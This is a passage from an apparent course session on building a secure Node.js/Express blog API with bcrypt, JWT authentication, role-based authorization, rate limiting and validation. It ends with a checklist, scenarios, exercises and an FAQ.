npm init -y

# Install dependencies
npm install express mongoose bcrypt jsonwebtoken dotenv cors helmet express-validator express-rate-limit winston

# Install dev dependencies
npm install --save-dev nodemon
```

**package.json scripts:**

```json
{
  "scripts": {
    "start": "node server.js",
    "dev": "nodemon server.js"
  }
}
```

---

### Step 2: Environment Configuration

**.env**

```
PORT=5000
MONGODB_URI=mongodb://localhost:27017/secure-blog
JWT_SECRET=your_super_secure_jwt_secret_min_32_characters_long
NODE_ENV=development
```

**.gitignore**

```
node_modules/
.env
.env.local
.env.production
*.log
```

---

### Step 3: Database Models

**models/User.js**

```javascript
const mongoose = require('mongoose');

const userSchema = new mongoose.Schema({
  username: {
    type: String,
    required: [true, 'Username is required'],
    unique: true,
    trim: true,
    minlength: [3, 'Username must be at least 3 characters'],
    maxlength: [20, 'Username cannot exceed 20 characters']
  },
  email: {
    type: String,
    required: [true, 'Email is required'],
    unique: true,
    lowercase: true,
    match: [/^\S+@\S+\.\S+$/, 'Please enter a valid email']
  },
  password: {
    type: String,
    required: [true, 'Password is required'],
    minlength: [8, 'Password must be at least 8 characters']
  },
  role: {
    type: String,
    enum: ['user', 'moderator', 'admin'],
    default: 'user'
  },
  isActive: {
    type: Boolean,
    default: true
  },
  lastLogin: {
    type: Date
  },
  createdAt: {
    type: Date,
    default: Date.now
  }
});

module.exports = mongoose.model('User', userSchema);
```

**models/Post.js**

```javascript
const mongoose = require('mongoose');

const postSchema = new mongoose.Schema({
  title: {
    type: String,
    required: [true, 'Title is required'],
    trim: true,
    maxlength: [200, 'Title cannot exceed 200 characters']
  },
  content: {
    type: String,
    required: [true, 'Content is required']
  },
  author: {
    type: mongoose.Schema.Types.ObjectId,
    ref: 'User',
    required: true
  },
  published: {
    type: Boolean,
    default: false
  },
  createdAt: {
    type: Date,
    default: Date.now
  },
  updatedAt: {
    type: Date,
    default: Date.now
  }
});

module.exports = mongoose.model('Post', postSchema);
```

---

### Step 4: Authentication Middleware

**middleware/auth.js**

```javascript
const jwt = require('jsonwebtoken');
const User = require('../models/User');

const authenticateToken = async (req, res, next) => {
  try {
    // Get token from header
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];

    if (!token) {
      return res.status(401).json({ 
        success: false,
        error: 'Access token required' 
      });
    }

    // Verify token
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    
    // Check if user still exists and is active
    const user = await User.findById(decoded.userId).select('-password');
    
    if (!user || !user.isActive) {
      return res.status(401).json({ 
        success: false,
        error: 'User not found or inactive' 
      });
    }

    // Attach user to request
    req.user = user;
    next();

  } catch (error) {
    if (error.name === 'JsonWebTokenError') {
      return res.status(403).json({ 
        success: false,
        error: 'Invalid token' 
      });
    }
    if (error.name === 'TokenExpiredError') {
      return res.status(403).json({ 
        success: false,
        error: 'Token expired' 
      });
    }
    res.status(500).json({ 
      success: false,
      error: 'Authentication failed' 
    });
  }
};

module.exports = authenticateToken;
```

**middleware/authorize.js**

```javascript
const authorizeRoles = (...allowedRoles) => {
  return (req, res, next) => {
    if (!req.user) {
      return res.status(401).json({ 
        success: false,
        error: 'Authentication required' 
      });
    }

    if (!allowedRoles.includes(req.user.role)) {
      return res.status(403).json({ 
        success: false,
        error: `Access denied. Required role: ${allowedRoles.join(' or ')}` 
      });
    }

    next();
  };
};

module.exports = authorizeRoles;
```

---

### Step 5: Authentication Routes

**routes/auth.js**

```javascript
const express = require('express');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const { body, validationResult } = require('express-validator');
const rateLimit = require('express-rate-limit');
const User = require('../models/User');

const router = express.Router();

// Rate limiters
const registerLimiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1 hour
  max: 3, // 3 registrations per hour
  message: 'Too many accounts created, please try again later'
});

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 login attempts
  message: 'Too many login attempts, please try again later'
});

// Validation rules
const registerValidation = [
  body('username')
    .trim()
    .isLength({ min: 3, max: 20 })
    .withMessage('Username must be 3-20 characters')
    .isAlphanumeric()
    .withMessage('Username must contain only letters and numbers'),
  
  body('email')
    .trim()
    .isEmail()
    .withMessage('Invalid email address')
    .normalizeEmail(),
  
  body('password')
    .isLength({ min: 8 })
    .withMessage('Password must be at least 8 characters')
    .matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])/)
    .withMessage('Password must contain uppercase, lowercase, number, and special character')
];

const loginValidation = [
  body('email').trim().isEmail().withMessage('Invalid email'),
  body('password').notEmpty().withMessage('Password is required')
];

// Register route
router.post('/register', registerLimiter, registerValidation, async (req, res) => {
  try {
    // Check validation errors
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ 
        success: false,
        errors: errors.array() 
      });
    }

    const { username, email, password } = req.body;

    // Check if user exists
    const existingUser = await User.findOne({ 
      $or: [{ email }, { username }] 
    });

    if (existingUser) {
      return res.status(409).json({ 
        success: false,
        error: existingUser.email === email 
          ? 'Email already registered' 
          : 'Username already taken'
      });
    }

    // Hash password
    const saltRounds = 10;
    const hashedPassword = await bcrypt.hash(password, saltRounds);

    // Create user
    const newUser = new User({
      username,
      email,
      password: hashedPassword
    });

    await newUser.save();

    res.status(201).json({ 
      success: true,
      message: 'User registered successfully',
      user: {
        id: newUser._id,
        username: newUser.username,
        email: newUser.email,
        role: newUser.role
      }
    });

  } catch (error) {
    console.error('Registration error:', error);
    res.status(500).json({ 
      success: false,
      error: 'Registration failed' 
    });
  }
});

// Login route
router.post('/login', loginLimiter, loginValidation, async (req, res) => {
  try {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ 
        success: false,
        errors: errors.array() 
      });
    }

    const { email, password } = req.body;

    // Find user
    const user = await User.findOne({ email });
    if (!user || !user.isActive) {
      return res.status(401).json({ 
        success: false,
        error: 'Invalid credentials' 
      });
    }

    // Verify password
    const isPasswordValid = await bcrypt.compare(password, user.password);
    if (!isPasswordValid) {
      return res.status(401).json({ 
        success: false,
        error: 'Invalid credentials' 
      });
    }

    // Update last login
    user.lastLogin = new Date();
    await user.save();

    // Generate JWT
    const token = jwt.sign(
      { 
        userId: user._id,
        email: user.email,
        role: user.role
      },
      process.env.JWT_SECRET,
      { expiresIn: '24h' }
    );

    res.json({ 
      success: true,
      message: 'Login successful',
      token,
      user: {
        id: user._id,
        username: user.username,
        email: user.email,
        role: user.role
      }
    });

  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ 
      success: false,
      error: 'Login failed' 
    });
  }
});

module.exports = router;
```

---

### Step 6: Post Routes with Authorization

**routes/posts.js**

```javascript
const express = require('express');
const { body, validationResult } = require('express-validator');
const Post = require('../models/Post');
const authenticateToken = require('../middleware/auth');
const authorizeRoles = require('../middleware/authorize');

const router = express.Router();

const postValidation = [
  body('title')
    .trim()
    .isLength({ min: 5, max: 200 })
    .withMessage('Title must be 5-200 characters'),
  body('content')
    .trim()
    .isLength({ min: 10 })
    .withMessage('Content must be at least 10 characters')
];

// Get all published posts (public)
router.get('/', async (req, res) => {
  try {
    const posts = await Post.find({ published: true })
      .populate('author', 'username')
      .sort({ createdAt: -1 });
    
    res.json({ 
      success: true,
      count: posts.length,
      posts 
    });
  } catch (error) {
    res.status(500).json({ 
      success: false,
      error: 'Failed to fetch posts' 
    });
  }
});

// Create post (authenticated users)
router.post('/', authenticateToken, postValidation, async (req, res) => {
  try {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ 
        success: false,
        errors: errors.array() 
      });
    }

    const { title, content } = req.body;

    const newPost = new Post({
      title,
      content,
      author: req.user._id
    });

    await newPost.save();

    res.status(201).json({ 
      success: true,
      message: 'Post created successfully',
      post: newPost 
    });

  } catch (error) {
    res.status(500).json({ 
      success: false,
      error: 'Failed to create post' 
    });
  }
});

// Update own post
router.put('/:id', authenticateToken, postValidation, async (req, res) => {
  try {
    const post = await Post.findById(req.params.id);

    if (!post) {
      return res.status(404).json({ 
        success: false,
        error: 'Post not found' 
      });
    }

    // Check ownership or admin
    if (post.author.toString() !== req.user._id.toString() && req.user.role !== 'admin') {
      return res.status(403).json({ 
        success: false,
        error: 'Not authorized to update this post' 
      });
    }

    const { title, content } = req.body;
    post.title = title;
    post.content = content;
    post.updatedAt = new Date();

    await post.save();

    res.json({ 
      success: true,
      message: 'Post updated successfully',
      post 
    });

  } catch (error) {
    res.status(500).json({ 
      success: false,
      error: 'Failed to update post' 
    });
  }
});

// Delete post (admin or moderator)
router.delete('/:id', authenticateToken, authorizeRoles('admin', 'moderator'), async (req, res) => {
  try {
    const post = await Post.findByIdAndDelete(req.params.id);

    if (!post) {
      return res.status(404).json({ 
        success: false,
        error: 'Post not found' 
      });
    }

    res.json({ 
      success: true,
      message: 'Post deleted successfully' 
    });

  } catch (error) {
    res.status(500).json({ 
      success: false,
      error: 'Failed to delete post' 
    });
  }
});

// Publish post (admin only)
router.patch('/:id/publish', authenticateToken, authorizeRoles('admin'), async (req, res) => {
  try {
    const post = await Post.findById(req.params.id);

    if (!post) {
      return res.status(404).json({ 
        success: false,
        error: 'Post not found' 
      });
    }

    post.published = !post.published;
    await post.save();

    res.json({ 
      success: true,
      message: `Post ${post.published ? 'published' : 'unpublished'} successfully`,
      post 
    });

  } catch (error) {
    res.status(500).json({ 
      success: false,
      error: 'Failed to update post status' 
    });
  }
});

module.exports = router;
```

---

### Step 7: Main Server File

**server.js**

```javascript
require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const helmet = require('helmet');

const authRoutes = require('./routes/auth');
const postRoutes = require('./routes/posts');

const app = express();

// Security middleware
app.use(helmet());
app.use(cors({
  origin: process.env.NODE_ENV === 'production'
    ? process.env.FRONTEND_URL
    : 'http://localhost:3000',
  credentials: true
}));

// Body parser
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Routes
app.use('/api/auth', authRoutes);
app.use('/api/posts', postRoutes);

// Health check
app.get('/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// 404 handler
app.use((req, res) => {
  res.status(404).json({ 
    success: false,
    error: 'Route not found' 
  });
});

// Global error handler
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(err.status || 500).json({
    success: false,
    error: process.env.NODE_ENV === 'production' 
      ? 'Something went wrong' 
      : err.message
  });
});

// Database connection
mongoose.connect(process.env.MONGODB_URI)
  .then(() => {
    console.log('✅ Connected to MongoDB');
    
    // Start server
    const PORT = process.env.PORT || 5000;
    app.listen(PORT, () => {
      console.log(`🚀 Server running on port ${PORT}`);
      console.log(`📝 Environment: ${process.env.NODE_ENV}`);
    });
  })
  .catch((error) => {
    console.error('❌ MongoDB connection error:', error);
    process.exit(1);
  });
```

---

### Step 8: Testing the API

**Test with cURL or Postman:**

```bash
# 1. Register a user
curl -X POST http://localhost:5000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "john_doe",
    "email": "john@example.com",
    "password": "SecurePass123!"
  }'

# 2. Login
curl -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "john@example.com",
    "password": "SecurePass123!"
  }'
# Save the token from response

# 3. Create a post (replace YOUR_TOKEN)
curl -X POST http://localhost:5000/api/posts \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{
    "title": "My First Secure Post",
    "content": "This post is created with proper authentication!"
  }'

# 4. Get all published posts (no auth needed)
curl http://localhost:5000/api/posts

# 5. Update your post
curl -X PUT http://localhost:5000/api/posts/POST_ID \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{
    "title": "Updated Title",
    "content": "Updated content here"
  }'
```

---

## 🎓 Key Takeaways & Summary

### What We Learned Today

```mermaid
mindmap
  root((Authentication<br/>& Security))
    Authentication
      Password Hashing
      JWT Tokens
      Session Management
      Login/Register
    Authorization
      Role Based Access
      Permissions
      Route Protection
      Middleware
    Security
      SQL Injection
      XSS Prevention
      CSRF Protection
      Input Validation
    Best Practices
      HTTPS
      Rate Limiting
      Error Handling
      Logging
```

### The Complete Security Flow

```mermaid
sequenceDiagram
    participant U as User
    participant C as Client
    participant MW as Middleware
    participant S as Server
    participant DB as Database
    
    Note over U,DB: Registration Phase
    U->>C: Fill registration form
    C->>C: Client-side validation
    C->>S: POST /register
    S->>S: Validate & sanitize input
    S->>S: Hash password (bcrypt)
    S->>DB: Save user
    DB-->>S: User created
    S-->>C: Success response
    
    Note over U,DB: Login Phase
    U->>C: Enter credentials
    C->>S: POST /login
    S->>DB: Find user
    DB-->>S: User data
    S->>S: Compare password
    S->>S: Generate JWT
    S-->>C: Return token
    C->>C: Store token
    
    Note over U,DB: Protected Request
    U->>C: Request protected resource
    C->>MW: Request + JWT token
    MW->>MW: Verify token
    MW->>MW: Check permissions
    MW->>S: Authorized request
    S->>DB: Fetch data
    DB-->>S: Data
    S-->>C: Response
    C-->>U: Display data
```

---

## 📊 Authentication Comparison Chart

| Aspect | Session-Based | Token-Based (JWT) | OAuth 2.0 |
|--------|---------------|-------------------|-----------|
| **Storage** | Server-side | Client-side | Token server |
| **State** | Stateful | Stateless | Stateless |
| **Scalability** | ⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
| **Mobile Support** | ⭐⭐ | ⭐⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |
| **Complexity** | Simple | Medium | Complex |
| **Logout** | Easy | Complex | Medium |
| **Best For** | Traditional web apps | SPAs, APIs | Third-party auth |

---

## 🔍 Common Mistakes to Avoid

### ❌ DON'T DO THIS

```javascript
// 1. Storing passwords in plain text
const user = { password: "mypassword123" }; // NEVER!

// 2. Using weak JWT secrets
const JWT_SECRET = "secret"; // TOO SIMPLE!

// 3. Not validating input
app.post('/register', (req, res) => {
  const { email } = req.body;
  // Using directly without validation - DANGEROUS!
});

// 4. Exposing sensitive errors
catch (error) {
  res.json({ error: error.message }); // Leaks info!
}

// 5. No rate limiting
app.post('/login', loginHandler); // Open to brute force!

// 6. Checking only password, not if user exists
if (password === user.password) { } // Timing attack vulnerable!

// 7. Not using HTTPS in production
// All your security is useless without HTTPS!

// 8. Hardcoding secrets in code
const secret = "my-jwt-secret-123"; // NEVER COMMIT THIS!

// 9. Not implementing token expiration
jwt.sign({ userId: user.id }, secret); // No expiry!

// 10. Trusting client-side validation only
// Always validate on server side!
```

---

## ✅ Security Implementation Checklist

### Pre-Launch Security Audit

* [ ] **Authentication**
  * [ ] Passwords hashed with bcrypt (salt rounds ≥ 10)
  * [ ] JWT secret is strong and stored in environment variables
  * [ ] Token expiration implemented (24 hours recommended)
  * [ ] Rate limiting on login/register endpoints
  * [ ] Account lockout after multiple failed attempts
  
* [ ] **Authorization**
  * [ ] Role-based access control implemented
  * [ ] Users can only access their own resources
  * [ ] Admin routes properly protected
  * [ ] Middleware properly checks permissions
  
* [ ] **Input Validation**
  * [ ] All user inputs validated and sanitized
  * [ ] Email format validation
  * [ ] Password strength requirements enforced
  * [ ] SQL injection protection (parameterized queries)
  * [ ] XSS protection (output encoding)
  
* [ ] **Security Headers**
  * [ ] Helmet.js installed and configured
  * [ ] Content Security Policy (CSP) implemented
  * [ ] CORS properly configured (not wildcard in production)
  * [ ] X-Frame-Options, X-Content-Type-Options set
  
* [ ] **HTTPS & Cookies**
  * [ ] HTTPS enforced in production
  * [ ] Cookies set with httpOnly, secure, sameSite
  * [ ] No sensitive data in cookies
  
* [ ] **Error Handling**
  * [ ] Generic error messages to users
  * [ ] Detailed errors logged server-side only
  * [ ] No stack traces exposed in production
  
* [ ] **Dependencies**
  * [ ] All packages up to date
  * [ ] Known vulnerabilities checked (`npm audit`)
  * [ ] Unnecessary packages removed
  
* [ ] **Monitoring**
  * [ ] Logging implemented (Winston, Morgan, etc.)
  * [ ] Failed login attempts tracked
  * [ ] Suspicious activity monitoring
  * [ ] Regular security audits scheduled

---

## 📚 Additional Resources

### Recommended Reading

1. **OWASP Top 10** - Most critical web application security risks
   * <https://owasp.org/www-project-top-ten/>

2. **JWT Best Practices**
   * Token expiration strategies
   * Refresh token implementation
   * Secure storage options

3. **Password Security**
   * Bcrypt vs Argon2 vs SCrypt
   * Password policy guidelines
   * Multi-factor authentication (MFA)

4. **API Security**
   * Rate limiting strategies
   * API key management
   * OAuth 2.0 and OpenID Connect

### Tools for Security Testing

* **npm audit** - Check for vulnerable dependencies
* **Snyk** - Find and fix security vulnerabilities
* **OWASP ZAP** - Web application security scanner
* **Burp Suite** - Security testing toolkit
* **Postman** - API testing and security checks

---

## 💡 Real-World Scenarios & Examples

### Scenario 1: E-commerce Platform

**Requirements:**

* Customers can register and login
* View their order history (own orders only)
* Update profile information
* Admins can view all orders
* Moderators can update order status

**Implementation:**

```javascript
// User roles
const roles = {
  CUSTOMER: 'customer',
  MODERATOR: 'moderator',
  ADMIN: 'admin'
};

// Get my orders (customers)
router.get('/my-orders', 
  authenticateToken, 
  authorizeRoles(roles.CUSTOMER, roles.ADMIN),
  async (req, res) => {
    const orders = await Order.find({ userId: req.user._id });
    res.json({ orders });
  }
);

// Get all orders (admin only)
router.get('/all-orders', 
  authenticateToken, 
  authorizeRoles(roles.ADMIN),
  async (req, res) => {
    const orders = await Order.find({});
    res.json({ orders });
  }
);

// Update order status (moderator & admin)
router.patch('/orders/:id/status', 
  authenticateToken, 
  authorizeRoles(roles.MODERATOR, roles.ADMIN),
  async (req, res) => {
    const { status } = req.body;
    await Order.findByIdAndUpdate(req.params.id, { status });
    res.json({ message: 'Status updated' });
  }
);
```

---

### Scenario 2: Social Media Platform

**Requirements:**

* Users create posts (text, images)
* Users can edit/delete own posts
* Moderators can delete any post
* Report system for inappropriate content

**Security Considerations:**

```javascript
// Image upload validation
const upload = multer({
  limits: { fileSize: 5 * 1024 * 1024 }, // 5MB max
  fileFilter: (req, file, cb) => {
    const allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
    if (!allowedTypes.includes(file.mimetype)) {
      return cb(new Error('Invalid file type'));
    }
    cb(null, true);
  }
});

// Delete post (owner or moderator)
router.delete('/posts/:id', authenticateToken, async (req, res) => {
  const post = await Post.findById(req.params.id);
  
  const isOwner = post.author.toString() === req.user._id.toString();
  const isModerator = ['moderator', 'admin'].includes(req.user.role);
  
  if (!isOwner && !isModerator) {
    return res.status(403).json({ error: 'Not authorized' });
  }
  
  await post.deleteOne();
  res.json({ message: 'Post deleted' });
});
```

---

### Scenario 3: Healthcare Application

**Critical Security Requirements:**

* HIPAA compliance
* Encrypted data at rest
* Audit logs for all access
* Strong authentication (MFA recommended)
* Role-based access (doctor, nurse, admin, patient)

**Implementation Example:**

```javascript
// Audit logging
const logAccess = async (req, resourceType, resourceId, action) => {
  await AuditLog.create({
    userId: req.user._id,
    userRole: req.user.role,
    resourceType,
    resourceId,
    action,
    ipAddress: req.ip,
    timestamp: new Date()
  });
};

// Access patient record
router.get('/patients/:id', 
  authenticateToken,
  authorizeRoles('doctor', 'nurse', 'admin'),
  async (req, res) => {
    // Log the access
    await logAccess(req, 'patient', req.params.id, 'READ');
    
    const patient = await Patient.findById(req.params.id);
    
    // Decrypt sensitive fields
    const decryptedData = {
      ...patient.toObject(),
      ssn: decrypt(patient.ssn),
      medicalHistory: decrypt(patient.medicalHistory)
    };
    
    res.json({ patient: decryptedData });
  }
);
```

---

## 🎯 Practice Exercises

### Exercise 1: Add Password Reset Functionality

**Task:** Implement a secure password reset feature

**Requirements:**

1. User requests password reset with email
2. Generate secure reset token
3. Send email with reset link (expires in 1 hour)
4. User clicks link and enters new password
5. Validate token and update password

**Hints:**

```javascript
// Generate reset token
const crypto = require('crypto');
const resetToken = crypto.randomBytes(32).toString('hex');
const hashedToken = crypto.createHash('sha256').update(resetToken).digest('hex');

// Store hashed token with expiry
user.resetPasswordToken = hashedToken;
user.resetPasswordExpire = Date.now() + 3600000; // 1 hour
await user.save();

// Send email with original token (not hashed)
const resetUrl = `${req.protocol}://${req.get('host')}/reset-password/${resetToken}`;
```

---

### Exercise 2: Implement Two-Factor Authentication (2FA)

**Task:** Add 2FA using TOTP (Time-based One-Time Password)

**Steps:**

1. User enables 2FA in settings
2. Generate QR code with secret
3. User scans with authenticator app
4. Require 2FA code during login
5. Provide backup codes

**Libraries:** `speakeasy`, `qrcode`

---

### Exercise 3: Add OAuth Login (Google/GitHub)

**Task:** Implement social login with Passport.js

**Requirements:**

1. Register app with OAuth provider
2. Configure Passport strategy
3. Handle OAuth callback
4. Link OAuth account to existing user or create new one

---

### Exercise 4: Build Admin Dashboard

**Task:** Create protected admin routes with user management

**Features:**

* View all users
* Change user roles
* Activate/deactivate accounts
* View login history
* Security audit logs

---

## 🔬 Advanced Topics (Beyond This Session)

### 1. Refresh Tokens

**Problem:** Short-lived access tokens expire quickly
**Solution:** Use refresh tokens to get new access tokens

```mermaid
sequenceDiagram
    participant C as Client
    participant S as Server
    
    C->>S: Login
    S-->>C: Access Token (15min) + Refresh Token (7 days)
    Note over C: Access token expires
    C->>S: Request with expired token
    S-->>C: 401 Token Expired
    C->>S: POST /refresh with refresh token
    S->>S: Validate refresh token
    S-->>C: New Access Token
    C->>S: Request with new token
    S-->>C: Protected data
```

---

### 2. Multi-Factor Authentication (MFA)

**Types:**

* **SMS OTP** - Text message codes
* **Email OTP** - Email codes
* **TOTP** - Time-based (Google Authenticator)
* **Hardware tokens** - YubiKey, etc.
* **Biometric** - Fingerprint, Face ID

---

### 3. Single Sign-On (SSO)

**Protocols:**

* **SAML 2.0** - Enterprise SSO
* **OAuth 2.0** - Social login
* **OpenID Connect** - Modern identity layer

---

### 4. API Rate Limiting Strategies

**Types:**

* **Fixed Window** - X requests per hour
* **Sliding Window** - More accurate
* **Token Bucket** - Burst handling
* **Leaky Bucket** - Smooth rate limiting

---

### 5. WebAuthn & Passwordless Authentication

The future of authentication:

* No passwords to remember
* Biometric authentication
* Hardware security keys
* Phishing-resistant

---

## 🎬 Conclusion

### What You Can Build Now

After this session, you have the skills to build:

✅ **Secure user registration and login systems**
✅ **Protected API routes with authentication**
✅ **Role-based access control**
✅ **Production-ready security measures**
✅ **Protection against common vulnerabilities**

### The Security Mindset

Remember these principles:

1. **Defense in Depth** - Multiple layers of security
2. **Principle of Least Privilege** - Give minimum necessary access
3. **Fail Securely** - Errors should deny access, not grant it
4. **Keep it Simple** - Complex security is hard to maintain
5. **Security is a Process** - Not a one-time implementation

---

## 📝 Assignment

Build a **Task Management API** with complete authentication and authorization:

**Requirements:**

* ✅ User registration and login
* ✅ Users can create, read, update, delete their own tasks
* ✅ Team leaders can view all team tasks
* ✅ Admins can manage all users and tasks
* ✅ Implement all security best practices covered
* ✅ Add rate limiting and validation
* ✅ Include proper error handling and logging

**Bonus Points:**

* Implement password reset
* Add email verification
* Create API documentation
* Write security tests
* Deploy to production with HTTPS

---

## 🌟 Final Thoughts

> "Security is not a product, but a process." - Bruce Schneier

Authentication and security are **ongoing responsibilities**. Stay updated with:

* Latest security vulnerabilities
* New attack vectors
* Best practices evolution
* Security patches for dependencies

### Next Steps

1. Practice building the hands-on project
2. Read OWASP Top 10
3. Explore advanced authentication patterns
4. Learn about security testing
5. Study real-world security breaches and lessons learned

---

## 📞 Questions?

**Common Questions:**

**Q: Should I use sessions or JWT?**
A: JWT for stateless APIs and mobile apps. Sessions for traditional web apps.

**Q: How long should JWT tokens last?**
A: Access tokens: 15-60 minutes. Refresh tokens: 7-30 days.

**Q: Is bcrypt better than Argon2?**
A: Both are excellent. Bcrypt is more established, Argon2 is newer and potentially stronger.

**Q: How do I invalidate JWT tokens?**
A: Implement a token blacklist or use short expiry times with refresh tokens.

**Q: What's the best password policy?**
A: Min 8 characters, mix of uppercase, lowercase, numbers, special characters. Consider using passphrases!

---

## 🎓 Session Complete

You're now equipped with enterprise-level authentication and security knowledge. Go build secure applications! 🚀🔐

**Remember:** The best time to implement security is NOW, not after a breach!

---

<div align="center">

### 🔐 Stay Secure, Stay Updated, Stay Vigilant! 🔐

**Next Session:** Session 22 - Testing & Debugging Web Applications

</div>
